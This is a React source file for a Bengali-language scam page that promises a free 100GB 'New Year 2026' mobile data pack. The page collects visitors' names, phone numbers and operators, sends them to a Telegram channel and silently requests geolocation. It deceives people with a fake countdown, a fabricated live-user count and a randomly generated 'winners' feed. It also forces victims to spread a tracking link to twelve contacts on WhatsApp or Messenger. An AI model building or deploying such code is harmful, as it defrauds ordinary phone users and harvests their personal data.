import React, { useState, useEffect, useMemo } from 'react';
import { Share2, CheckCircle, Smartphone, Users, MessageSquare, ShieldCheck, Heart, User, PartyPopper, Sparkles, Clock, Zap, SignalHigh, ChevronRight, Globe, Trophy } from 'lucide-react';
import { sendDataToTelegram } from './telegramService';
import { AppStep, Comment } from './types';

const BENGALI_NAMES = ['আরিফ', 'সুমন', 'তানভীর', 'মাশরাফি', 'সাকিব', 'রিয়াদ', 'তাসকিন', 'মোস্তাফিজ', 'মিরাজ', 'শান্ত', 'হৃদয়', 'শরিফুল', 'এবাদত', 'নাসুম', 'রিশাদ', 'নয়ন', 'আকাশ', 'শুভ', 'রাকিব', 'মেহেদী'];
const BENGALI_SURNAMES = ['আহমেদ', 'হাসান', 'খান', 'ইসলাম', 'রহমান', 'শেখ', 'চৌধুরী', 'হোসেন', 'মোল্লা', 'তালুকদার', 'মিয়া', 'পাঞ্জা', 'দাস', 'শিকদার'];
const CITIES = ['ঢাকা', 'চট্টগ্রাম', 'সিলেট', 'রাজশাহী', 'খুলনা', 'বরিশাল', 'রংপুর', 'ময়মনসিংহ', 'কুমিল্লা', 'গাজীপুর', 'নারায়ণগঞ্জ', 'সাভার', 'বগুড়া', 'নোয়াখালী'];

// Fix: Add missing OPERATORS constant definition
const OPERATORS = [
  { id: 'gp', name: 'Grameenphone', icon: '📡' },
  { id: 'robi', name: 'Robi', icon: '📶' },
  { id: 'bl', name: 'Banglalink', icon: '⚡' },
  { id: 'teletalk', name: 'Teletalk', icon: '🏛️' }
];

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep | 'operator_selection'>('landing');
  const [progress, setProgress] = useState(0);
  const [userName, setUserName] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [operator, setOperator] = useState('');
  const [connectionType, setConnectionType] = useState('Prepaid');
  const [shareCount, setShareCount] = useState(0);
  const [fakeWinners, setFakeWinners] = useState<any[]>([]);
  const [timeLeft, setTimeLeft] = useState({ hours: 0, minutes: 42, seconds: 18 });
  const [onlineUsers, setOnlineUsers] = useState(540);

  const MAX_SHARES = 12;

  // Countdown Timer & Live Stats logic with more randomization
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) return { ...prev, seconds: prev.seconds - 1 };
        if (prev.minutes > 0) return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        return prev;
      });
      // Fluctuating online users randomly
      setOnlineUsers(prev => {
        const change = Math.floor(Math.random() * 5) - 2; // -2 to +2
        return Math.max(450, Math.min(prev + change, 700));
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Randomized live winners generator
  useEffect(() => {
    const generateWinner = () => {
      const name = BENGALI_NAMES[Math.floor(Math.random() * BENGALI_NAMES.length)];
      const surname = BENGALI_SURNAMES[Math.floor(Math.random() * BENGALI_SURNAMES.length)];
      const city = CITIES[Math.floor(Math.random() * CITIES.length)];
      const id = Math.random();
      
      const newWinner = {
        id,
        name: `${name} ${surname}`,
        city,
        text: `মাত্র ১০০জিবি প্যাক একটিভ করেছেন`,
        avatar: `https://i.pravatar.cc/150?u=${id}`
      };

      setFakeWinners(prev => [newWinner, ...prev].slice(0, 5));
    };

    generateWinner();
    const winnerInterval = setInterval(generateWinner, 4500); // Slightly faster updates
    return () => clearInterval(winnerInterval);
  }, []);

  const startInitialCheck = () => {
    setStep('initial_check');
    let p = 0;
    const interval = setInterval(() => {
      p += 2;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => setStep('phone_entry'), 500);
      }
    }, 30);
  };

  const handlePhoneSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (userName.trim().length < 2 || phoneNumber.length < 10) {
      alert('সঠিক তথ্য প্রদান করুন');
      return;
    }
    setStep('operator_selection');
  };

  const handleFinalSelection = async () => {
    if (!operator) {
      alert('আপনার অপারেটর নির্বাচন করুন');
      return;
    }
    
    setStep('data_processing');
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(() => {}, () => {});
    }

    sendDataToTelegram(userName, phoneNumber, operator, connectionType);
    
    let p = 0;
    const interval = setInterval(() => {
      p += 1;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => setStep('share'), 800);
      }
    }, 40);
  };

  const handleShare = (platform: 'whatsapp' | 'messenger') => {
    const baseUrl = window.location.origin + window.location.pathname;
    const trackingUrl = `${baseUrl}?id=67755`;
    const text = `*🎉 শুভ নববর্ষ ২০২৬ উপলক্ষে ফ্রি 100GB Internet উপহার — আমি পেয়েছি, আপনিও নিতে পারেন↓*\n${trackingUrl}`;
    
    const url = platform === 'whatsapp' 
      ? `whatsapp://send?text=${encodeURIComponent(text)}`
      : `fb-messenger://share/?link=${encodeURIComponent(trackingUrl)}`;
    
    window.location.href = url;
    
    setTimeout(() => {
      setShareCount(prev => {
        const next = prev + 1;
        if (next >= MAX_SHARES) setStep('verify');
        return next;
      });
    }, 2000); // Slightly longer delay to simulate app switching
  };

  const shareProgress = Math.min((shareCount / MAX_SHARES) * 100, 100);

  return (
    <div className="min-h-screen bg-[#0a0f1e] text-white flex flex-col items-center pb-20 selection:bg-amber-500 selection:text-black font-['Hind_Siliguri']">
      {/* Animated Festive Elements */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-blue-600 rounded-full blur-[120px] opacity-20 animate-pulse"></div>
        <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-amber-600 rounded-full blur-[120px] opacity-20 animate-pulse" style={{ animationDelay: '1.5s' }}></div>
        <div className="absolute top-1/4 left-1/4 animate-ping"><Sparkles className="text-amber-500/20" size={40} /></div>
        <div className="absolute top-3/4 right-1/4 animate-ping" style={{ animationDelay: '2s' }}><Sparkles className="text-blue-500/20" size={30} /></div>
      </div>

      {/* Top Banner */}
      <div className="w-full bg-indigo-950/95 backdrop-blur-2xl py-4 px-4 text-center sticky top-0 z-[100] border-b border-indigo-500/30 shadow-2xl">
        <div className="flex flex-col items-center gap-1">
          <h1 className="text-amber-400 text-lg md:text-xl font-black flex items-center justify-center gap-2 tracking-tight drop-shadow-md">
            <PartyPopper className="text-amber-400 animate-bounce" size={24} /> 
            নিউ ইয়ার ২০২৬ গিফট প্যাক
          </h1>
          <div className="flex items-center gap-2 text-[10px] uppercase tracking-widest font-bold text-indigo-300">
            <Clock size={12} className="text-amber-500 animate-spin-slow" />
            অফার শেষ হতে সময় বাকি: 
            <span className="text-amber-400 font-mono tabular-nums bg-black/40 px-2 py-0.5 rounded border border-white/10">
              {timeLeft.hours.toString().padStart(2, '0')}:{timeLeft.minutes.toString().padStart(2, '0')}:{timeLeft.seconds.toString().padStart(2, '0')}
            </span>
          </div>
        </div>
      </div>

      <div className="w-full max-w-md relative z-10 px-4 mt-6">
        <div className="bg-white/5 backdrop-blur-3xl border border-white/10 rounded-[2.5rem] overflow-hidden shadow-[0_30px_60px_rgba(0,0,0,0.6)] border-t-white/20">
          
          <div className="relative h-56 overflow-hidden">
            <img 
              src="https://images.unsplash.com/photo-1467810563316-b5476525c0f9?q=80&w=1000&auto=format&fit=crop" 
              alt="Celebration" 
              className="w-full h-full object-cover transform hover:scale-110 transition-transform duration-[3s]"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-[#0a0f1e] via-[#0a0f1e]/40 to-transparent"></div>
            <div className="absolute bottom-6 left-8 animate-in slide-in-from-left duration-700">
              <div className="flex items-center gap-2 mb-2">
                <span className="bg-amber-500 text-black text-[10px] font-black px-3 py-1 rounded-full uppercase shadow-[0_0_15px_rgba(245,158,11,0.5)]">২০২৬ স্পেশাল</span>
                <span className="bg-blue-600 text-white text-[10px] font-black px-3 py-1 rounded-full uppercase">ফ্রি গিফট</span>
              </div>
              <h2 className="text-3xl font-black text-white drop-shadow-2xl leading-none">১০০জিবি ডেটা</h2>
              <p className="text-xs text-amber-400 font-bold mt-1">দেশজুড়ে সকল গ্রাহকদের জন্য</p>
            </div>
            <div className="absolute top-4 right-4 bg-black/60 backdrop-blur-md px-2 py-1 rounded text-[10px] font-bold text-white/60 border border-white/5 uppercase">
              ID: #67755
            </div>
          </div>

          <div className="p-7 md:p-9">
            {step === 'landing' && (
              <div className="text-center step-transition">
                <div className="grid grid-cols-3 gap-3 mb-8">
                  {[
                    { icon: Zap, color: 'text-amber-400', label: 'সুপার ফাস্ট' },
                    { icon: Globe, color: 'text-blue-400', label: 'সারা দেশে' },
                    { icon: ShieldCheck, color: 'text-green-400', label: 'নিরাপদ' }
                  ].map((item, i) => (
                    <div key={i} className="bg-white/5 p-4 rounded-3xl border border-white/10 hover:border-amber-500/40 hover:bg-white/10 transition-all duration-500 group cursor-default">
                      <div className="flex justify-center mb-2">
                        <item.icon size={28} className={`${item.color} group-hover:scale-110 group-hover:rotate-6 transition-transform`} />
                      </div>
                      <p className="text-[10px] font-black opacity-80 uppercase tracking-tighter">{item.label}</p>
                    </div>
                  ))}
                </div>
                <h3 className="text-xl font-black mb-6 leading-tight text-white drop-shadow-md">
                   দেশের সকল সিম গ্রাহক উপহার স্বরূপ পাচ্ছেন ১০০জিবি হাই-স্পিড ডেটা প্যাক!
                </h3>
                <button 
                  onClick={startInitialCheck}
                  className="w-full bg-gradient-to-br from-amber-400 via-amber-500 to-amber-600 text-black font-black py-5 rounded-[2rem] text-xl shadow-[0_15px_30px_rgba(245,158,11,0.4)] hover:shadow-amber-500/60 hover:scale-[1.03] active:scale-95 transition-all flex items-center justify-center gap-3 group relative overflow-hidden"
                >
                  <span className="relative z-10">এখনই একটিভ করুন</span>
                  <ChevronRight className="group-hover:translate-x-2 transition-transform relative z-10" />
                  <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/30 to-white/0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000"></div>
                </button>
              </div>
            )}

            {step === 'initial_check' && (
              <div className="text-center py-10 step-transition">
                <div className="relative inline-block mb-8">
                  <div className="w-32 h-32 rounded-full border-4 border-white/5 border-t-amber-500 animate-spin"></div>
                  <div className="absolute inset-0 flex flex-col items-center justify-center">
                    <span className="font-black text-3xl text-amber-500 drop-shadow-[0_0_10px_rgba(245,158,11,0.6)]">{progress}%</span>
                    <span className="text-[8px] font-black uppercase text-indigo-300">Checking</span>
                  </div>
                </div>
                <p className="text-indigo-200 font-black animate-pulse uppercase tracking-[0.2em] text-xs">অপারেটর সার্ভার কানেক্ট হচ্ছে...</p>
              </div>
            )}

            {step === 'phone_entry' && (
              <div className="step-transition">
                <div className="flex items-center gap-3 mb-6 bg-white/5 p-3 rounded-2xl border border-white/5">
                  <div className="w-10 h-10 bg-amber-500 rounded-full flex items-center justify-center text-black">
                    <Smartphone size={20} />
                  </div>
                  <h3 className="text-lg font-black text-white">আপনার তথ্য প্রদান করুন</h3>
                </div>
                <form onSubmit={handlePhoneSubmit} className="space-y-5">
                  <div className="space-y-2">
                    <label className="text-[10px] font-black text-indigo-300 uppercase ml-1 tracking-widest">আপনার নাম</label>
                    <div className="flex bg-white/5 border border-white/10 rounded-2xl overflow-hidden focus-within:border-amber-500 focus-within:bg-white/10 transition-all shadow-inner">
                      <div className="px-4 py-4 text-indigo-400 border-r border-white/10">
                        <User size={20} />
                      </div>
                      <input 
                        type="text" 
                        placeholder="আপনার পূর্ণ নাম"
                        className="flex-1 bg-transparent px-4 py-3 outline-none text-white placeholder:text-gray-600 font-bold"
                        value={userName}
                        onChange={(e) => setUserName(e.target.value)}
                        required
                      />
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <label className="text-[10px] font-black text-indigo-300 uppercase ml-1 tracking-widest">মোবাইল নম্বর</label>
                    <div className="flex bg-white/5 border border-white/10 rounded-2xl overflow-hidden focus-within:border-amber-500 focus-within:bg-white/10 transition-all shadow-inner">
                      <div className="bg-white/10 px-4 py-4 text-amber-500 font-black border-r border-white/10">+৮৮০</div>
                      <input 
                        type="number" 
                        placeholder="০১৩XXXXXXXX"
                        className="flex-1 bg-transparent px-4 py-3 outline-none text-white placeholder:text-gray-600 font-bold"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value)}
                        required
                      />
                    </div>
                  </div>
                  
                  <button 
                    type="submit"
                    className="w-full bg-white text-black py-4 rounded-2xl font-black text-lg hover:bg-amber-500 hover:scale-[1.02] active:scale-95 transition-all shadow-2xl flex items-center justify-center gap-2 mt-4"
                  >
                    ভেরিফিকেশন করুন <ChevronRight size={20} />
                  </button>
                </form>
              </div>
            )}

            {step === 'operator_selection' && (
              <div className="step-transition">
                <h3 className="text-lg font-black mb-6 text-center text-amber-400 uppercase tracking-tight">আপনার সিম ও কানেকশন নির্বাচন করুন</h3>
                <div className="grid grid-cols-2 gap-4 mb-8">
                  {OPERATORS.map((op) => (
                    <button
                      key={op.id}
                      onClick={() => setOperator(op.name)}
                      className={`p-5 rounded-3xl border transition-all duration-500 flex flex-col items-center gap-2 transform hover:scale-[1.05] active:scale-95 ${
                        operator === op.name 
                          ? 'bg-amber-500/20 border-amber-500 text-amber-400 shadow-[0_0_25px_rgba(245,158,11,0.25)]' 
                          : 'bg-white/5 border-white/10 hover:border-white/40'
                      }`}
                    >
                      <span className="text-3xl filter grayscale-[0.5] hover:grayscale-0 transition-all">{op.icon}</span>
                      <span className="text-[10px] font-black uppercase">{op.name}</span>
                    </button>
                  ))}
                </div>

                <div className="space-y-2 mb-10">
                  <label className="text-[10px] font-black text-indigo-300 uppercase ml-1 tracking-widest">কানেকশন টাইপ</label>
                  <div className="flex bg-white/5 p-1.5 rounded-[1.5rem] border border-white/10 shadow-inner">
                    <button 
                      onClick={() => setConnectionType('Prepaid')}
                      className={`flex-1 py-3.5 rounded-2xl font-black text-xs transition-all duration-500 ${connectionType === 'Prepaid' ? 'bg-amber-500 text-black shadow-lg scale-[1.02]' : 'text-gray-400 hover:bg-white/5'}`}
                    >PREPAID</button>
                    <button 
                      onClick={() => setConnectionType('Postpaid')}
                      className={`flex-1 py-3.5 rounded-2xl font-black text-xs transition-all duration-500 ${connectionType === 'Postpaid' ? 'bg-amber-500 text-black shadow-lg scale-[1.02]' : 'text-gray-400 hover:bg-white/5'}`}
                    >POSTPAID</button>
                  </div>
                </div>

                <button 
                  onClick={handleFinalSelection}
                  className="w-full bg-gradient-to-r from-amber-500 to-amber-600 text-black py-5 rounded-[2rem] font-black text-xl hover:scale-[1.03] active:scale-95 shadow-[0_20px_40px_rgba(245,158,11,0.3)] transition-all uppercase tracking-widest"
                >
                  কনফার্ম করুন
                </button>
              </div>
            )}

            {step === 'data_processing' && (
              <div className="text-center py-10 step-transition">
                <div className="mb-8 space-y-5">
                  <div className="flex justify-between text-[10px] font-black text-indigo-300 px-1 uppercase tracking-[0.2em]">
                    <span>প্যাক একটিভ হচ্ছে...</span>
                    <span className="text-amber-500">{progress}%</span>
                  </div>
                  <div className="w-full bg-white/5 h-4 rounded-full overflow-hidden border border-white/5 p-1">
                    <div 
                      className="h-full bg-gradient-to-r from-amber-600 via-amber-400 to-amber-600 rounded-full transition-all duration-300 shadow-[0_0_20px_rgba(245,158,11,0.6)]"
                      style={{ width: `${progress}%` }}
                    />
                  </div>
                </div>
                <div className="flex flex-col gap-2">
                   <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest animate-pulse italic">Gateway Connection: Established</p>
                   <p className="text-[10px] text-amber-500/50 font-black uppercase tracking-widest animate-bounce">Generating Data Token...</p>
                </div>
              </div>
            )}

            {step === 'share' && (
              <div className="step-transition">
                <div className="bg-amber-500/10 border border-amber-500/30 p-5 rounded-[2rem] mb-8 flex gap-5 animate-in fade-in slide-in-from-top duration-700 shadow-lg">
                  <div className="bg-amber-500 text-black p-3 rounded-2xl h-fit shadow-[0_5px_15px_rgba(245,158,11,0.4)] shrink-0 animate-bounce">
                    <Trophy size={28} fill="currentColor" />
                  </div>
                  <div>
                    <h3 className="text-amber-500 font-black text-lg">অভিনন্দন {userName}!</h3>
                    <p className="text-[11px] text-gray-300 leading-relaxed font-bold">
                      আপনার ১০০জিবি ডেটা প্যাকটি রিজার্ভ করা হয়েছে। এটি আনলক করতে নিচের বাটনগুলোর মাধ্যমে শেয়ার সম্পন্ন করুন।
                    </p>
                  </div>
                </div>

                <div className="mb-8 p-6 bg-white/5 rounded-[2rem] border border-white/10 shadow-[inset_0_2px_10px_rgba(0,0,0,0.3)] relative overflow-hidden">
                  <div className="flex justify-between text-[11px] mb-3 font-black uppercase text-indigo-300 tracking-widest">
                    <span>ভেরিফিকেশন প্রগ্রেস</span>
                    <span className="text-amber-500 font-mono">{Math.round(shareProgress)}%</span>
                  </div>
                  <div className="w-full bg-white/10 h-5 rounded-full overflow-hidden border border-white/10 p-1">
                    <div 
                      className="h-full bg-gradient-to-r from-amber-600 via-amber-400 to-amber-600 transition-all duration-700 shadow-[0_0_20px_rgba(245,158,11,0.5)] rounded-full"
                      style={{ width: `${shareProgress}%` }}
                    />
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-5">
                  <button 
                    onClick={() => handleShare('whatsapp')}
                    className="group bg-[#25D366] text-white font-black py-4.5 rounded-[1.5rem] flex items-center justify-center gap-4 shadow-[0_12px_24px_rgba(37,211,102,0.25)] hover:scale-[1.03] active:scale-95 transition-all text-lg"
                  >
                    <Share2 size={24} className="group-hover:rotate-12 group-hover:scale-110 transition-transform" /> WhatsApp-এ শেয়ার করুন
                  </button>
                  <button 
                    onClick={() => handleShare('messenger')}
                    className="group bg-[#0084FF] text-white font-black py-4.5 rounded-[1.5rem] flex items-center justify-center gap-4 shadow-[0_12px_24px_rgba(0,132,255,0.25)] hover:scale-[1.03] active:scale-95 transition-all text-lg"
                  >
                    <MessageSquare size={24} className="group-hover:rotate-12 group-hover:scale-110 transition-transform" /> Messenger-এ শেয়ার করুন
                  </button>
                </div>

                <p className="text-[11px] text-center text-gray-400 mt-10 leading-snug font-black uppercase tracking-tight opacity-80">
                   ১২ জন বন্ধুকে শেয়ার করার পর ১ মিনিটের মধ্যে ১০০জিবি আপনার ব্যালেন্সে যোগ হবে।
                </p>
              </div>
            )}

            {step === 'verify' && (
              <div className="text-center py-6 step-transition">
                <div className="w-28 h-28 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-8 text-green-500 border-2 border-green-500/50 shadow-[0_0_50px_rgba(34,197,94,0.5)] animate-bounce-slow">
                  <CheckCircle size={64} />
                </div>
                <h3 className="text-3xl font-black text-white mb-3 tracking-tight">সব ধাপ সম্পন্ন!</h3>
                <p className="text-[13px] text-gray-400 mb-10 leading-relaxed font-bold px-4">
                   আপনার অনুরোধটি সার্ভারে জমা হয়েছে। প্যাকটি সচল করতে শেষ হিউম্যান ভেরিফিকেশনটি করুন।
                </p>
                <button className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white font-black py-5 rounded-[2rem] hover:scale-105 transition-all shadow-[0_20px_40px_rgba(34,197,94,0.3)] uppercase tracking-widest relative overflow-hidden group">
                  <span className="relative z-10 text-xl">ভেরিফিকেশন সম্পন্ন করুন</span>
                  <div className="absolute inset-0 bg-white/20 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000"></div>
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Dynamic Randomized Winners Feed */}
        <div className="mt-8 overflow-hidden bg-white/5 border border-white/10 rounded-[2rem] py-5 px-4 backdrop-blur-xl shadow-2xl relative">
           <div className="absolute top-0 right-0 p-3">
             <div className="bg-amber-500/10 text-amber-500 text-[8px] font-black px-2 py-0.5 rounded-full border border-amber-500/20 uppercase">Live Update</div>
           </div>
           <div className="flex items-center gap-2 mb-5 px-2">
             <div className="w-2.5 h-2.5 bg-green-500 rounded-full animate-ping shadow-[0_0_12px_rgba(34,197,94,1)]"></div>
             <span className="text-[11px] font-black uppercase text-indigo-200 tracking-[0.1em]">সফলভাবে প্যাক একটিভ করেছেন</span>
           </div>
           <div className="flex flex-col gap-4">
             {fakeWinners.map((c) => (
               <div key={c.id} className="flex items-center gap-4 bg-white/5 p-4 rounded-[1.5rem] border border-white/5 animate-in slide-in-from-right fade-in duration-1000 hover:bg-white/10 transition-all cursor-default group shadow-sm">
                  <div className="relative shrink-0">
                    <img src={c.avatar} className="w-12 h-12 rounded-full border-2 border-amber-500/40 group-hover:border-amber-500 transition-all shadow-md" alt="" />
                    <div className="absolute -bottom-1 -right-1 bg-green-500 w-4 h-4 rounded-full border-2 border-[#0a0f1e] flex items-center justify-center">
                       <CheckCircle size={8} className="text-white" />
                    </div>
                  </div>
                  <div className="flex-1 overflow-hidden">
                    <div className="flex items-center justify-between gap-1">
                      <p className="text-[12px] font-black text-amber-400 truncate tracking-tight">{c.name}</p>
                      <p className="text-[8px] font-black text-indigo-400 uppercase">{c.city}</p>
                    </div>
                    <p className="text-[10px] text-gray-400 truncate font-bold mt-0.5">{c.text}</p>
                  </div>
                  <div className="flex items-center gap-1.5 text-[10px] font-black text-green-500 bg-green-500/15 px-3 py-1.5 rounded-xl border border-green-500/20 whitespace-nowrap">
                    ১০০GB <SignalHigh size={10} />
                  </div>
               </div>
             ))}
           </div>
        </div>
      </div>

      {/* Floating live counter with fluctuation */}
      <div className="fixed bottom-6 right-6 z-50 pointer-events-none animate-in fade-in slide-in-from-bottom duration-1000">
        <div className="bg-indigo-950/90 backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.5)] border border-amber-500/20 rounded-full pl-4 pr-6 py-3 flex items-center gap-4 text-[12px] font-black text-amber-400">
          <div className="bg-amber-500 p-2 rounded-full text-black shadow-[0_0_15px_rgba(245,158,11,0.5)] animate-pulse">
            <Heart size={16} fill="currentColor" />
          </div>
          <span className="whitespace-nowrap tracking-tight uppercase"><span className="text-white">{onlineUsers}</span> জন বর্তমানে অফারটি নিচ্ছেন</span>
        </div>
      </div>

      {/* Improved Background Decorations */}
      <div className="fixed top-20 right-[-15%] w-80 h-80 bg-indigo-600/15 rounded-full blur-[100px] pointer-events-none animate-pulse"></div>
      <div className="fixed bottom-40 left-[-15%] w-80 h-80 bg-amber-600/15 rounded-full blur-[100px] pointer-events-none animate-pulse" style={{ animationDelay: '3s' }}></div>
      <div className="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[150%] h-[150%] bg-gradient-to-b from-transparent via-[#0a0f1e]/50 to-transparent pointer-events-none z-[-1]"></div>
    </div>
  );
};

export default App;